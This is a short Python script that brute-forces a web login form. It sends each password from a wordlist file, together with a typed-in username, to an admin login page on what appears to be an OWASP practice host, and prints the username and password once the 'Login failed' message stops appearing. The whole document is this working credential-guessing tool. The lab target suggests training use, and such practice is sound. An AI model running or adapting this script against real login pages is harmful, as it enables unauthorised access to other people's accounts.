import requests
from termcolor import colored

def bruteforce(username, url):
    for password in passwords:
        password = password.strip('\n')
        print(colored("Trying Password: %s" % password, "yellow"))
        dataDict = {"username":username, "password":password, "Login":"submit"}
        response = requests.post(url, data=dataDict)
        if b"Login failed" in response.content:
            pass
        else:
            print(colored("[+] Username --> " + username, "green"))
            print(colored("[+] Password --> " + password, "green"))
            exit()

page_url = "http://owaspsrm/admin/login.php"
username = input("Enter Username For Specified Page: ")

with open("passwordList.txt", "r") as passwords:
    bruteforce(username, page_url)

print(colored("[-] Password Not Found in List", "red"))

# My fav 22 
